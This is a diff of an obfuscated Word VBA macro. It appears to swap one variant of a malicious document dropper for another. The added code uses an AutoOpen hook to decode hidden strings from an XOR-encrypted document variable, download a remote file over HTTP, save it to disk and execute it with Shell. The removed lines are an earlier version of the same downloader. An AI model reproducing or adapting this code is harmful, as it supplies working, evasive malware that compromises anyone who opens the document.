@@ -1,90 +1,98 @@
 "Use this line to add the document variable to you file and then remove these comments."
-ActiveDocument.Variables.Add Name:="HqALWdduaWnXWcrn", Value:="RUVnpffKtpiCBNvS9HhpOdro+2zw2xa+RdPrffl5DBXjpWKWiT8Krzlf2XF1L+5CJYDtJGhvvcp6M8Zs8RjKjXvFIyeG6LhyQre+KNkjStamUzrmn7nPIAqbZOFIMk8aF8Y1xd1ZKSBsRhHXHspk9odhg4vZjjWwvtqAWg=="
-Private RFcSbnQCzYrDm       As Boolean
-Private YJarZgpmDt(0 To 63)  As Byte
-Private tJPUPozrVWTZx(0 To (51+76)) As Byte
-Sub UUpgJoVuQJTIAL()
-Dim hiApxarRiqGkSH: Set hiApxarRiqGkSH = CreateObject(BFXjXkfZxNgQ(Array((2+(4 Xor 2)),(0+22),(32 Xor 31),(130+(26 Xor 124)),(100+87),((7 Xor 25)+(43 Xor 241)),(152+0),(110 Xor 165),(84+(144 Xor 3))),(0 Xor 0)) & BFXjXkfZxNgQ(Array(((47 Xor 114)+(17 Xor 8)),173,(17+166),134,(4+28),36,((1 Xor 5)+(102 Xor 23)),146,188,(173+(2 Xor 0)),60,222,237,(37 Xor 29),((48 Xor 126)+64)),(3 Xor 10)))
-Dim QpBNWxVmXOi: Set QpBNWxVmXOi = CreateObject(BFXjXkfZxNgQ(Array((3+(0 Xor 1)),(123+(6 Xor 58)),132,(9 Xor 16),155,((1 Xor 51)+37),(55 Xor 104),(64 Xor 33),((81 Xor 8)+(1 Xor 57)),(121+71)),(15+9)) & BFXjXkfZxNgQ(Array((3 Xor 0),(144+107)),34))
-hiApxarRiqGkSH.Open BFXjXkfZxNgQ(Array((67 Xor 141),(72+50),((8 Xor 25)+77)),(26 Xor 62)), BFXjXkfZxNgQ(Array(199,77,((4 Xor 28)+(3 Xor 16)),169,2,((22 Xor 15)+54),0,((6 Xor 107)+(35 Xor 119)),(17 Xor 53),(56+8),((14 Xor 41)+(168 Xor 110)),((38 Xor 78)+49),(59 Xor 112),(5 Xor 67),(12+(15 Xor 28))),(32 Xor 7)) & BFXjXkfZxNgQ(Array((59+(142 Xor 1)),(127 Xor 154),(14 Xor 17),((22 Xor 55)+33),(35+133),(18+(17 Xor 92)),223,(35+90),((34 Xor 116)+92),(58 Xor 210)),(49+(3 Xor 6))), False
-hiApxarRiqGkSH.Send
-With QpBNWxVmXOi
-.Type = 1
-.Open
-.write hiApxarRiqGkSH.responseBody
-.savetofile BFXjXkfZxNgQ(Array(56,(9 Xor 246),((62 Xor 111)+46),(85 Xor 39)),(12 Xor 76)) & BFXjXkfZxNgQ(Array(((23 Xor 64)+158),((19 Xor 51)+109),(199+3),((0 Xor 1)+0),30,((0 Xor 3)+228),203,((0 Xor 7)+67),(110 Xor 219),(58+(16 Xor 0)),41,138,(181+(0 Xor 12)),(1 Xor 51),(46 Xor 121),((15 Xor 31)+115),(190+45),(180+(12 Xor 17)),170,(53 Xor 122),(64+(45 Xor 21)),(69+157),(17 Xor 91),(24+108),(46+(2 Xor 0)),(79+(7 Xor 15))),((9 Xor 46)+29)), (0 Xor 2)
-End With
-Shell (BFXjXkfZxNgQ(Array(((2 Xor 0)+10),(17 Xor 49),(17+(20 Xor 46)),147,70,((119 Xor 232)+(1 Xor 0)),(54 Xor 153),42,(5 Xor 112),112,((11 Xor 0)+(1 Xor 15)),36,125,(179 Xor 13),(13+112)),94) & BFXjXkfZxNgQ(Array((72+78),(3 Xor 0),(50+(89 Xor 60)),(181 Xor 95),(4+(0 Xor 0)),((203 Xor 41)+21),((27 Xor 98)+106),((76 Xor 32)+80),(45+(84 Xor 224)),71,(80+(111 Xor 22)),(18 Xor 130),191,248,63),109))
+ActiveDocument.Variables.Add Name:="KzuqwpoiBtsdoOgL", Value:="aKSpw28797lCq0P/nHcscbU01v+OLCULuZbAIqAbmnp6PhHcKaWEaKm9dJgZL4eHuHfZE4zHSvIRLrk2elvFQucFHmwZlSdXC56pIMWMdSAOqxzh1P5uX/5ursuVakGM96tYKcVBu1SPm9z+CC52cvN3zLyl21jOXs3cEv3a1kSjxbyCxfFRV0jV308NDKMidvYD9WQlarryzOSw9wsuDUZhjnphh1QnMsmMhmm3zSR+o/M="
+Private txmgoPZlCmQwzX       As Boolean
+Private VJYPQFSGSnnAvM(((0 Xor 0) + 0) To (49 + (7 Xor 9))) As Byte
+Private eOtxmzlEEB((0 + 0) To (8 + 119)) As Byte
+
+Sub AutoOpen()
+    kOuEpKHYvmanF
 End Sub
-Public Function veUMrDIwiS(ByVal YliwTZFvujFv As String) As Byte()
-If Not RFcSbnQCzYrDm Then HnBXmZxBInb
-Dim pzAIAePSRYb() As Byte: pzAIAePSRYb = WpJDdBYhoVz(YliwTZFvujFv)
-Dim khXXOLmvrqAXH As Long: khXXOLmvrqAXH = UBound(pzAIAePSRYb) + (0 Xor 1)
-If khXXOLmvrqAXH Mod 4 <> (0+(0 Xor 0)) Then Err.Raise vbObjectError, , ""
-Do While khXXOLmvrqAXH > ((0 Xor 0)+0)
-If pzAIAePSRYb(khXXOLmvrqAXH - 1) <> Asc("=") Then Exit Do
-khXXOLmvrqAXH = khXXOLmvrqAXH - (0 Xor 1)
-Loop
-Dim avNtHNfLyL As Long: avNtHNfLyL = (khXXOLmvrqAXH * 3) \ (3 Xor 7)
-Dim gyRfiQQVPegWx() As Byte
-ReDim gyRfiQQVPegWx(((0 Xor 0)+0) To avNtHNfLyL - (1 Xor 0)) As Byte
-Dim ZVgRcGQmZgG As Long
-Dim xPROcSOJsqh As Long
-Do While ZVgRcGQmZgG < khXXOLmvrqAXH
-Dim VrZFhHDvxBa As Byte: VrZFhHDvxBa = pzAIAePSRYb(ZVgRcGQmZgG): ZVgRcGQmZgG = ZVgRcGQmZgG + (1 Xor 0)
-Dim lAwQqkQNcOyFLM As Byte: lAwQqkQNcOyFLM = pzAIAePSRYb(ZVgRcGQmZgG): ZVgRcGQmZgG = ZVgRcGQmZgG + 1
-Dim NMMVpsBYwMnO As Byte: If ZVgRcGQmZgG < khXXOLmvrqAXH Then NMMVpsBYwMnO = pzAIAePSRYb(ZVgRcGQmZgG): ZVgRcGQmZgG = ZVgRcGQmZgG + (0 Xor 1) Else NMMVpsBYwMnO = Asc("A")
-Dim guSuPpVMpEssqU As Byte: If ZVgRcGQmZgG < khXXOLmvrqAXH Then guSuPpVMpEssqU = pzAIAePSRYb(ZVgRcGQmZgG): ZVgRcGQmZgG = ZVgRcGQmZgG + (1 Xor 0) Else guSuPpVMpEssqU = Asc("A")
-If VrZFhHDvxBa > (117+(2 Xor 8)) Or lAwQqkQNcOyFLM > 127 Or NMMVpsBYwMnO > ((45 Xor 114)+32) Or guSuPpVMpEssqU > ((57 Xor 100)+34) Then _
-Err.Raise vbObjectError, , ""
-Dim qCTmyHptiUP As Byte: qCTmyHptiUP = tJPUPozrVWTZx(VrZFhHDvxBa)
-Dim DPPkXlfJqd As Byte: DPPkXlfJqd = tJPUPozrVWTZx(lAwQqkQNcOyFLM)
-Dim fTLBZThIpiNUCn As Byte: fTLBZThIpiNUCn = tJPUPozrVWTZx(NMMVpsBYwMnO)
-Dim CQydVIrbHDE As Byte: CQydVIrbHDE = tJPUPozrVWTZx(guSuPpVMpEssqU)
-If qCTmyHptiUP > 63 Or DPPkXlfJqd > ((3 Xor 10)+(29 Xor 43)) Or fTLBZThIpiNUCn > (6+(16 Xor 41)) Or CQydVIrbHDE > ((12 Xor 37)+(6 Xor 16)) Then _
-Err.Raise vbObjectError, , ""
-Dim OTuKIpEPZySeWV As Byte: OTuKIpEPZySeWV = (qCTmyHptiUP * (2+2)) Or (DPPkXlfJqd \ &H10)
-Dim MZQpjtNMVORYX As Byte: MZQpjtNMVORYX = ((DPPkXlfJqd And &HF) * &H10) Or (fTLBZThIpiNUCn \ ((2 Xor 1)+(0 Xor 1)))
-Dim vKMRmLapqxR As Byte: vKMRmLapqxR = ((fTLBZThIpiNUCn And (3+0)) * &H40) Or CQydVIrbHDE
-gyRfiQQVPegWx(xPROcSOJsqh) = OTuKIpEPZySeWV: xPROcSOJsqh = xPROcSOJsqh + ((0 Xor 0)+(0 Xor 1))
-If xPROcSOJsqh < avNtHNfLyL Then gyRfiQQVPegWx(xPROcSOJsqh) = MZQpjtNMVORYX: xPROcSOJsqh = xPROcSOJsqh + (0 Xor 1)
-If xPROcSOJsqh < avNtHNfLyL Then gyRfiQQVPegWx(xPROcSOJsqh) = vKMRmLapqxR: xPROcSOJsqh = xPROcSOJsqh + (0 Xor 1)
-Loop
-veUMrDIwiS = gyRfiQQVPegWx
-End Function
-Private Sub HnBXmZxBInb()
-Dim piiVdVaBmR As Integer, MHGPzBZJaFirb As Integer
-MHGPzBZJaFirb = 0
-For piiVdVaBmR = Asc("A") To Asc("Z"): YJarZgpmDt(MHGPzBZJaFirb) = piiVdVaBmR: MHGPzBZJaFirb = MHGPzBZJaFirb + (0 Xor 1): Next
-For piiVdVaBmR = Asc("a") To Asc("z"): YJarZgpmDt(MHGPzBZJaFirb) = piiVdVaBmR: MHGPzBZJaFirb = MHGPzBZJaFirb + 1: Next
-For piiVdVaBmR = Asc("0") To Asc("9"): YJarZgpmDt(MHGPzBZJaFirb) = piiVdVaBmR: MHGPzBZJaFirb = MHGPzBZJaFirb + ((0 Xor 1)+(0 Xor 0)): Next
-YJarZgpmDt(MHGPzBZJaFirb) = Asc("+"): MHGPzBZJaFirb = MHGPzBZJaFirb + 1
-YJarZgpmDt(MHGPzBZJaFirb) = Asc("/"): MHGPzBZJaFirb = MHGPzBZJaFirb + 1
-For MHGPzBZJaFirb = (0 Xor 0) To (63 Xor 64): tJPUPozrVWTZx(MHGPzBZJaFirb) = (57 Xor 198): Next
-For MHGPzBZJaFirb = (0+(0 Xor 0)) To ((3 Xor 63)+3): tJPUPozrVWTZx(YJarZgpmDt(MHGPzBZJaFirb)) = MHGPzBZJaFirb: Next
-RFcSbnQCzYrDm = True
-End Sub
-Private Function WpJDdBYhoVz(ByVal YliwTZFvujFv As String) As Byte()
-Dim DPPkXlfJqd() As Byte: DPPkXlfJqd = YliwTZFvujFv
-Dim BCCqdKnqAyQqrL As Long: BCCqdKnqAyQqrL = (UBound(DPPkXlfJqd) + 1) \ ((1 Xor 0)+1)
-If BCCqdKnqAyQqrL = (0+(0 Xor 0)) Then WpJDdBYhoVz = DPPkXlfJqd: Exit Function
-Dim fTLBZThIpiNUCn() As Byte
-ReDim fTLBZThIpiNUCn((0 Xor 0) To BCCqdKnqAyQqrL - ((0 Xor 1)+0)) As Byte
-Dim LxJhusFQVKil As Long
-For LxJhusFQVKil = 0 To BCCqdKnqAyQqrL - ((0 Xor 0)+(0 Xor 1))
-Dim piiVdVaBmR As Long: piiVdVaBmR = DPPkXlfJqd(2 * LxJhusFQVKil) + (209+(5 Xor 42)) * CLng(DPPkXlfJqd((1 Xor 3) * LxJhusFQVKil + (0+1)))
-If piiVdVaBmR >= ((50 Xor 68)+(62 Xor 180)) Then piiVdVaBmR = Asc("?")
-fTLBZThIpiNUCn(LxJhusFQVKil) = piiVdVaBmR
-Next
-WpJDdBYhoVz = fTLBZThIpiNUCn
-End Function
-Private Function BFXjXkfZxNgQ(hwFSctFdRYqSO As Variant, TVdInPJewW As Integer)
-Dim VJavaJyLgiwA As String
-Dim tllCiYAyjX() As Byte
-tllCiYAyjX = veUMrDIwiS(ActiveDocument.Variables("HqALWdduaWnXWcrn"))
-VJavaJyLgiwA = ""
-For MHGPzBZJaFirb = LBound(hwFSctFdRYqSO) To UBound(hwFSctFdRYqSO)
-VJavaJyLgiwA = VJavaJyLgiwA & Chr(tllCiYAyjX(MHGPzBZJaFirb+TVdInPJewW) Xor hwFSctFdRYqSO(MHGPzBZJaFirb))
-Next
-BFXjXkfZxNgQ = VJavaJyLgiwA
+
+Sub kOuEpKHYvmanF()
+    Dim UEukPJvIUncC: Set UEukPJvIUncC = CreateObject(fKqDisDWaCZej(Array(37, 247, (51 Xor 194), 142, (9 Xor 42), ((1 Xor 6) + (2 Xor 0)), 217, ((96 Xor 224) + (14 Xor 100)), (8 Xor 47), (98 + 119), (21 + (21 Xor 53)), (138 Xor 16)), (0 Xor 0)) & fKqDisDWaCZej(Array(((50 Xor 96) + 156), 47, (27 Xor 122), (38 Xor 27), ((12 Xor 101) + 148), (1 Xor 97), ((3 Xor 32) + (77 Xor 18)), ((46 Xor 98) + (19 Xor 112)), 160, ((3 Xor 7) + 22), (4 + 7), (12 + (35 Xor 12))), ((0 Xor 1) + (9 Xor 2))))
+    Dim gMRFXmAGAbj: Set gMRFXmAGAbj = CreateObject(fKqDisDWaCZej(Array((205 Xor 53), ((0 Xor 43) + 199), (144 Xor 63), 70, (115 + 79), 53), (0 Xor 24)) & fKqDisDWaCZej(Array((38 + (16 Xor 179)), ((0 Xor 2) + 12), (8 + 0), ((1 Xor 8) + 82), (35 + (1 Xor 76)), (79 + 98)), (21 + (1 Xor 8))))
+    UEukPJvIUncC.Open fKqDisDWaCZej(Array((10 + (40 Xor 76)), (10 + 214), 208), (33 + (2 Xor 1))), fKqDisDWaCZej(Array((0 Xor 0), (81 + 140), (2 Xor 203), 4, (219 Xor 48), 35, (0 + 0), ((25 Xor 97) + 48), 227, (128 Xor 74), ((18 Xor 0) + (7 Xor 11)), 175, ((5 Xor 61) + (42 Xor 20)), (70 + (18 Xor 78)), (85 + 75), (7 + (27 Xor 5)), 157, (12 + (48 Xor 90)), (4 + (47 Xor 17)), (97 Xor 189), (8 Xor 16), (6 + 19), ((30 Xor 62) + 20), (99 + 69), (55 Xor 90), 146, ((40 Xor 102) + (24 Xor 0)), ((1 Xor 9) + (18 Xor 11)), ((2 Xor 0) + (7 Xor 0)), 97, ((39 Xor 118) + (146 Xor 6)), _
+    72, (0 + (17 Xor 52)), (100 + 27), ((49 Xor 97) + 83), 205, 79, 178, (27 Xor 249), (18 Xor 11), (69 + (0 Xor 10)), (12 + (80 Xor 51)), (8 + (121 Xor 190)), 58, ((103 Xor 31) + (11 Xor 27)), ((1 Xor 23) + (93 Xor 199)), (48 Xor 243), 95, (19 + 6), (37 + 111)), (18 + (5 Xor 16))) & fKqDisDWaCZej(Array(93, (136 + (3 Xor 87)), 167, (43 Xor 223), ((1 Xor 0) + 50), ((1 Xor 3) + 12), 211, (35 Xor 186), ((54 Xor 95) + (6 Xor 48)), ((4 Xor 44) + 4), 26, (28 + (69 Xor 33)), ((0 Xor 30) + (8 Xor 6)), (40 + (60 Xor 138)), 55, ((49 Xor 78) + 90), (146 Xor 78), ((52 Xor 87) + 135), _
+    176, 113, (20 Xor 85), ((0 Xor 1) + (1 Xor 3)), (1 Xor 0), ((89 Xor 223) + 55), 38, 147, 208, 235, ((75 Xor 24) + 92), 9), (84 + (0 Xor 5))), False
+    UEukPJvIUncC.Send
+    With gMRFXmAGAbj
+    .Type = (0 Xor 1)
+    .Open
+    .write UEukPJvIUncC.responseBody
+    .savetofile fKqDisDWaCZej(Array((125 + 16), (88 + 12), (40 Xor 185), (21 + 116), ((3 Xor 22) + (46 Xor 98)), 152, (39 Xor 143), (82 + 83), (21 + (0 Xor 3)), 243, (141 Xor 61), (89 Xor 135), (138 Xor 100), 172, 146, (1 Xor 12)), (67 Xor 52)) & fKqDisDWaCZej(Array((11 Xor 59), ((8 Xor 26) + (20 Xor 3)), 184, ((8 Xor 47) + (117 Xor 230)), (57 Xor 2), ((65 Xor 0) + (2 Xor 38)), (48 Xor 89), 204, (61 + 19), (6 Xor 9), (5 + 211), ((40 Xor 26) + 52), 141, (1 + (0 Xor 0))), (8 + (10 Xor 117))), ((1 Xor 0) + 1)
+    End With
+    Shell (fKqDisDWaCZej(Array(((33 Xor 4) + 65), (63 + (16 Xor 1)), (84 + (132 Xor 22)), (132 Xor 35), (99 Xor 220), (68 Xor 197), (88 Xor 154), 132, ((12 Xor 72) + (0 Xor 19)), 126, ((2 Xor 0) + 118), ((0 Xor 17) + 19), (13 Xor 0), ((9 Xor 70) + (10 Xor 146)), (18 Xor 11)), 149) & fKqDisDWaCZej(Array((29 Xor 32), ((62 Xor 92) + (86 Xor 40)), 53, (6 Xor 76), (59 + 28), 189, ((170 Xor 99) + (1 Xor 26)), 227, ((1 Xor 0) + (2 Xor 7)), 197, ((6 Xor 33) + (70 Xor 203)), ((0 Xor 8) + (1 Xor 3)), ((0 Xor 1) + 26), ((2 Xor 66) + 155), ((120 Xor 249) + 21)), _
+    (119 + 45)))
+    End Sub
+    Public Function tPMaJkYDnb(ByVal TyixjfCAAaDp As String) As Byte()
+    If Not txmgoPZlCmQwzX Then rnDThTamjHg
+    Dim AmXBXtmcHH() As Byte: AmXBXtmcHH = nBEFqHEheyqsXE(TyixjfCAAaDp)
+    Dim ZUyerNaQRunhT As Long: ZUyerNaQRunhT = UBound(AmXBXtmcHH) + (1 Xor 0)
+    If ZUyerNaQRunhT Mod 4 <> ((0 Xor 0) + (0 Xor 0)) Then Err.Raise vbObjectError, , ""
+    Do While ZUyerNaQRunhT > (0 + (0 Xor 0))
+    If AmXBXtmcHH(ZUyerNaQRunhT - (1 + 0)) <> Asc("=") Then Exit Do
+    ZUyerNaQRunhT = ZUyerNaQRunhT - (0 + (1 Xor 0))
+    Loop
+    Dim sSOqpEeJIzC As Long: sSOqpEeJIzC = (ZUyerNaQRunhT * (0 Xor 3)) \ 4
+    Dim SEJXMgLBAqEnVK() As Byte
+    ReDim SEJXMgLBAqEnVK(((0 Xor 0) + 0) To sSOqpEeJIzC - (0 + (0 Xor 1))) As Byte
+    Dim yOvYrLlyxKtHM As Long
+    Dim chKoyDaJFAh As Long
+    Do While yOvYrLlyxKtHM < ZUyerNaQRunhT
+    Dim wQBSEzBLJY As Byte: wQBSEzBLJY = AmXBXtmcHH(yOvYrLlyxKtHM): yOvYrLlyxKtHM = yOvYrLlyxKtHM + (0 Xor 1)
+    Dim CKDaDyFKfCSXvd As Byte: CKDaDyFKfCSXvd = AmXBXtmcHH(yOvYrLlyxKtHM): yOvYrLlyxKtHM = yOvYrLlyxKtHM + (0 Xor 1)
+    Dim HsFnHMfAnObe As Byte: If yOvYrLlyxKtHM < ZUyerNaQRunhT Then HsFnHMfAnObe = AmXBXtmcHH(yOvYrLlyxKtHM): yOvYrLlyxKtHM = yOvYrLlyxKtHM + (0 + 1) Else HsFnHMfAnObe = Asc("A")
+    Dim oJgBeoKCJfVhs As Byte: If yOvYrLlyxKtHM < ZUyerNaQRunhT Then oJgBeoKCJfVhs = AmXBXtmcHH(yOvYrLlyxKtHM): yOvYrLlyxKtHM = yOvYrLlyxKtHM + ((0 Xor 1) + (0 Xor 0)) Else oJgBeoKCJfVhs = Asc("A")
+    If wQBSEzBLJY > ((6 Xor 19) + 106) Or CKDaDyFKfCSXvd > (34 Xor 93) Or HsFnHMfAnObe > (10 Xor 117) Or oJgBeoKCJfVhs > (60 Xor 67) Then _
+    Err.Raise vbObjectError, , ""
+    Dim MBCixqembHOAV As Byte: MBCixqembHOAV = eOtxmzlEEB(wQBSEzBLJY)
+    Dim iwuoZBYtGVqHwM As Byte: iwuoZBYtGVqHwM = eOtxmzlEEB(CKDaDyFKfCSXvd)
+    Dim ppbmsxBOnPr As Byte: ppbmsxBOnPr = eOtxmzlEEB(HsFnHMfAnObe)
+    Dim gEImZqxYcQ As Byte: gEImZqxYcQ = eOtxmzlEEB(oJgBeoKCJfVhs)
+    If MBCixqembHOAV > ((1 Xor 6) + (1 Xor 57)) Or iwuoZBYtGVqHwM > (27 Xor 36) Or ppbmsxBOnPr > ((1 Xor 3) + (23 Xor 42)) Or gEImZqxYcQ > (10 Xor 53) Then _
+    Err.Raise vbObjectError, , ""
+    Dim RsPPfIfEBAxkQQ As Byte: RsPPfIfEBAxkQQ = (MBCixqembHOAV * 4) Or (iwuoZBYtGVqHwM \ &H10)
+    Dim JGilvYvvxI As Byte: JGilvYvvxI = ((iwuoZBYtGVqHwM And &HF) * &H10) Or (ppbmsxBOnPr \ (4 Xor 0))
+    Dim NTiQGWmDlVth As Byte: NTiQGWmDlVth = ((ppbmsxBOnPr And 3) * &H40) Or gEImZqxYcQ
+    SEJXMgLBAqEnVK(chKoyDaJFAh) = RsPPfIfEBAxkQQ: chKoyDaJFAh = chKoyDaJFAh + (0 Xor 1)
+    If chKoyDaJFAh < sSOqpEeJIzC Then SEJXMgLBAqEnVK(chKoyDaJFAh) = JGilvYvvxI: chKoyDaJFAh = chKoyDaJFAh + (1 Xor 0)
+    If chKoyDaJFAh < sSOqpEeJIzC Then SEJXMgLBAqEnVK(chKoyDaJFAh) = NTiQGWmDlVth: chKoyDaJFAh = chKoyDaJFAh + ((0 Xor 0) + 1)
+    Loop
+    tPMaJkYDnb = SEJXMgLBAqEnVK
+    End Function
+    Private Sub rnDThTamjHg()
+    Dim xworomFRoNMznG As Integer, GYXmtBNzbkWbu As Integer
+    GYXmtBNzbkWbu = (0 + 0)
+    For xworomFRoNMznG = Asc("A") To Asc("Z"): VJYPQFSGSnnAvM(GYXmtBNzbkWbu) = xworomFRoNMznG: GYXmtBNzbkWbu = GYXmtBNzbkWbu + ((0 Xor 0) + (0 Xor 1)): Next
+    For xworomFRoNMznG = Asc("a") To Asc("z"): VJYPQFSGSnnAvM(GYXmtBNzbkWbu) = xworomFRoNMznG: GYXmtBNzbkWbu = GYXmtBNzbkWbu + (0 Xor 1): Next
+    For xworomFRoNMznG = Asc("0") To Asc("9"): VJYPQFSGSnnAvM(GYXmtBNzbkWbu) = xworomFRoNMznG: GYXmtBNzbkWbu = GYXmtBNzbkWbu + (1 + 0): Next
+    VJYPQFSGSnnAvM(GYXmtBNzbkWbu) = Asc("+"): GYXmtBNzbkWbu = GYXmtBNzbkWbu + (0 Xor 1)
+    VJYPQFSGSnnAvM(GYXmtBNzbkWbu) = Asc("/"): GYXmtBNzbkWbu = GYXmtBNzbkWbu + 1
+    For GYXmtBNzbkWbu = (0 Xor 0) To (3 + 124): eOtxmzlEEB(GYXmtBNzbkWbu) = (210 + (31 Xor 50)): Next
+    For GYXmtBNzbkWbu = (0 + 0) To (23 + 40): eOtxmzlEEB(VJYPQFSGSnnAvM(GYXmtBNzbkWbu)) = GYXmtBNzbkWbu: Next
+    txmgoPZlCmQwzX = True
+    End Sub
+    Private Function nBEFqHEheyqsXE(ByVal TyixjfCAAaDp As String) As Byte()
+    Dim iwuoZBYtGVqHwM() As Byte: iwuoZBYtGVqHwM = TyixjfCAAaDp
+    Dim NRsTZAMCjJ As Long: NRsTZAMCjJ = (UBound(iwuoZBYtGVqHwM) + (1 Xor 0)) \ (2 Xor 0)
+    If NRsTZAMCjJ = (0 Xor 0) Then nBEFqHEheyqsXE = iwuoZBYtGVqHwM: Exit Function
+    Dim ppbmsxBOnPr() As Byte
+    ReDim ppbmsxBOnPr((0 + 0) To NRsTZAMCjJ - (1 + 0)) As Byte
+    Dim pGjtKEBKOD As Long
+    For pGjtKEBKOD = ((0 Xor 0) + (0 Xor 0)) To NRsTZAMCjJ - ((0 Xor 1) + 0)
+    Dim xworomFRoNMznG As Long: xworomFRoNMznG = iwuoZBYtGVqHwM(((0 Xor 1) + 1) * pGjtKEBKOD) + 256 * CLng(iwuoZBYtGVqHwM((1 Xor 3) * pGjtKEBKOD + (0 + 1)))
+    If xworomFRoNMznG >= 256 Then xworomFRoNMznG = Asc("?")
+    ppbmsxBOnPr(pGjtKEBKOD) = xworomFRoNMznG
+    Next
+    nBEFqHEheyqsXE = ppbmsxBOnPr
+    End Function
+    Private Function fKqDisDWaCZej(rYudPYoQpy As Variant, QPsSCkIYIg As Integer)
+    Dim HzVzJmOcqjVSuj As String
+    Dim iJmJktorUy() As Byte
+    iJmJktorUy = tPMaJkYDnb(ActiveDocument.Variables("KzuqwpoiBtsdoOgL"))
+    HzVzJmOcqjVSuj = ""
+    For GYXmtBNzbkWbu = LBound(rYudPYoQpy) To UBound(rYudPYoQpy)
+    HzVzJmOcqjVSuj = HzVzJmOcqjVSuj & Chr(iJmJktorUy(GYXmtBNzbkWbu + QPsSCkIYIg) Xor rYudPYoQpy(GYXmtBNzbkWbu))
+    Next
+    fKqDisDWaCZej = HzVzJmOcqjVSuj
 End Function
